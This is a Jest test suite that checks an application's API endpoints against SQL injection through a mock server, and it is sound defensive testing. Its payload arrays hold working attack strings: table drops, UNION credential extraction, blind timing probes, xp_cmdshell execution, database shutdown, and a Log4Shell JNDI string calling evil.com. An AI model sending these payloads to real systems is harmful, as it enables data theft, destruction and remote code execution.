/**
 * Task 4.1: SQL Injection Protection Tests for All API Endpoints
 * 
 * This test suite validates SQL injection protection across all application endpoints:
 * - Authentication endpoints (login, register, password reset)
 * - User management endpoints
 * - Admin endpoints
 * - File upload and processing endpoints
 * - API parameter validation
 * - Query sanitization verification
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { server } from '@test-mocks/api/mock-server';

describe('🛡️ Task 4.1: SQL Injection Protection Tests', () => {
  
  // Common SQL injection payloads for testing
  const sqlInjectionPayloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; INSERT INTO users VALUES('hacker', 'password'); --",
    "' UNION SELECT * FROM users --",
    "admin'--",
    "admin'/*",
    "' OR '1'='1' /*",
    "') OR ('1'='1",
    "'; EXEC xp_cmdshell('dir'); --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    "1'; UPDATE users SET password='hacked' WHERE username='admin'; --",
    "'; SELECT SLEEP(5); --",
    "' OR (SELECT COUNT(*) FROM users) > 0 --",
    "'; UNION SELECT password FROM users WHERE username='admin'; --"
  ];

  // Advanced injection patterns
  const advancedPayloads = [
    // Time-based blind SQL injection
    "'; IF (1=1) WAITFOR DELAY '00:00:05'; --",
    "' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5) --",
    
    // Boolean-based blind SQL injection
    "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a",
    "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    
    // Error-based SQL injection
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    
    // Second-order SQL injection
    "normal_user'; UPDATE users SET email='hacker@evil.com' WHERE username='admin'; --",
    
    // NoSQL injection patterns (for document databases)
    "{ $ne: null }",
    "{ $regex: '.*' }",
    "{ $where: 'this.username == this.password' }"
  ];

  beforeEach(() => {
    jest.clearAllMocks();
    global.fetch = server.mockFetch;
    server.listen({ onUnhandledRequest: 'error' });
  });

  afterEach(() => {
    server.resetHandlers();
    jest.restoreAllMocks();
  });

  afterAll(() => {
    server.close();
  });

  describe('🔐 Authentication Endpoint Protection', () => {
    it('should protect login endpoint from SQL injection in email field', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'testpassword'
          })
        });

        // Should not return 500 (server error) or expose database errors
        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          // Should not contain SQL error messages
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
          // Should be a proper validation error or 401
          expect([400, 401, 422]).toContain(response.status);
        }
      }
    });

    it('should protect login endpoint from SQL injection in password field', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'test@example.com',
            password: payload
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect registration endpoint from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/auth/signup', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            firstName: payload,
            lastName: payload,
            email: `test${Math.random()}@example.com`,
            password: 'validpassword123'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect password reset endpoint from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/auth/forgot-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect password reset confirmation from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/auth/reset-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            token: payload,
            password: 'newpassword123'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });
  });

  describe('👤 User Management Endpoint Protection', () => {
    it('should protect user profile update from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/user/profile', {
          method: 'PUT',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-token'
          },
          body: JSON.stringify({
            firstName: payload,
            lastName: payload,
            email: `updated${Math.random()}@example.com`
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect user profile retrieval from SQL injection in query params', async () => {
      for (const payload of sqlInjectionPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const response = await fetch(`/api/user/profile?search=${encodedPayload}`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer valid-token' }
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });
  });

  describe('🔧 Admin Endpoint Protection', () => {
    it('should protect admin user management from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/admin/users', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': 'Bearer admin-token'
          },
          body: JSON.stringify({
            email: payload,
            role: 'user',
            firstName: 'Test',
            lastName: 'User'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect admin user search from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const response = await fetch(`/api/admin/users?search=${encodedPayload}&role=${encodedPayload}`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer admin-token' }
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect admin user deletion from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch(`/api/admin/users/${encodeURIComponent(payload)}`, {
          method: 'DELETE',
          headers: { 'Authorization': 'Bearer admin-token' }
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect audit log queries from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const response = await fetch(`/api/admin/audit?user=${encodedPayload}&action=${encodedPayload}`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer admin-token' }
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });
  });

  describe('📁 File Operation Endpoint Protection', () => {
    it('should protect file upload metadata from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const formData = new FormData();
        formData.append('file', new Blob(['test content'], { type: 'text/plain' }));
        formData.append('filename', payload);
        formData.append('description', payload);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect document comparison metadata from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/compare', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'Authorization': 'Bearer valid-token'
          },
          body: JSON.stringify({
            document1: 'valid-id',
            document2: 'valid-id',
            title: payload,
            description: payload
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect file search from SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const encodedPayload = encodeURIComponent(payload);
        const response = await fetch(`/api/files?search=${encodedPayload}&type=${encodedPayload}`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer valid-token' }
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });
  });

  describe('🔬 Advanced SQL Injection Attack Patterns', () => {
    it('should protect against time-based blind SQL injection', async () => {
      const timeBasedPayloads = [
        "'; IF (1=1) WAITFOR DELAY '00:00:05'; --",
        "' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(5) --",
        "' OR (SELECT SLEEP(5)) --",
        "'; SELECT pg_sleep(5); --"
      ];

      for (const payload of timeBasedPayloads) {
        const startTime = Date.now();
        
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test'
          })
        });

        const responseTime = Date.now() - startTime;
        
        // Response should not be delayed by SQL injection
        expect(responseTime).toBeLessThan(3000); // 3 second max
        expect(response.status).not.toBe(500);
      }
    });

    it('should protect against boolean-based blind SQL injection', async () => {
      const booleanPayloads = [
        "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --",
        "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",
        "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0 --"
      ];

      for (const payload of booleanPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect against union-based SQL injection', async () => {
      const unionPayloads = [
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT NULL, version() --",
        "' UNION SELECT table_name, column_name FROM information_schema.columns --",
        "' UNION ALL SELECT user(), database() --"
      ];

      for (const payload of unionPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should protect against error-based SQL injection', async () => {
      const errorPayloads = [
        "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
        "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e)) --",
        "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x) --"
      ];

      for (const payload of errorPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          // Should not expose database structure or version info
          expect(data.message || data.error || '').not.toMatch(/version|table|column|database|mysql|postgres|sqlite/i);
        }
      }
    });
  });

  describe('🛡️ Parameter Validation and Sanitization', () => {
    it('should validate and sanitize URL parameters', async () => {
      const urlParams = [
        "1'; DROP TABLE users; --",
        "../../etc/passwd",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}"
      ];

      for (const param of urlParams) {
        const encodedParam = encodeURIComponent(param);
        const response = await fetch(`/api/user/profile/${encodedParam}`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer valid-token' }
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should validate request headers for SQL injection', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'User-Agent': payload,
            'X-Custom-Header': payload
          },
          body: JSON.stringify({
            email: 'test@example.com',
            password: 'testpassword'
          })
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });

    it('should handle malformed JSON with SQL injection attempts', async () => {
      const malformedPayloads = [
        `{"email": "test@example.com'; DROP TABLE users; --", "password": "test"}`,
        `{"email": "test@example.com", "password": "test' OR '1'='1"}`,
        `{"email": "test@example.com", "password": "test", "extraField": "'; UNION SELECT * FROM users --"}`
      ];

      for (const payload of malformedPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: payload
        });

        expect(response.status).not.toBe(500);
        
        if (!response.ok) {
          const data = await response.json();
          expect(data.message || data.error || '').not.toMatch(/SQL|syntax|mysql|postgres|database|query/i);
        }
      }
    });
  });

  describe('🔍 Database Error Exposure Prevention', () => {
    it('should not expose database connection errors', async () => {
      // Test with payloads that might cause database connection issues
      const connectionPayloads = [
        "'; SHUTDOWN; --",
        "'; SELECT pg_terminate_backend(pg_backend_pid()); --",
        "'; KILL CONNECTION_ID(); --"
      ];

      for (const payload of connectionPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test'
          })
        });

        if (!response.ok) {
          const data = await response.json();
          // Should not expose internal database errors
          expect(data.message || data.error || '').not.toMatch(/connection|timeout|database|server|host|port/i);
        }
      }
    });

    it('should not expose database schema information', async () => {
      const schemaPayloads = [
        "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns --",
        "'; SHOW TABLES; --",
        "'; DESCRIBE users; --"
      ];

      for (const payload of schemaPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test'
          })
        });

        if (!response.ok) {
          const data = await response.json();
          // Should not expose table or column names
          expect(data.message || data.error || '').not.toMatch(/users|accounts|sessions|table|column|schema/i);
        }
      }
    });
  });
}); 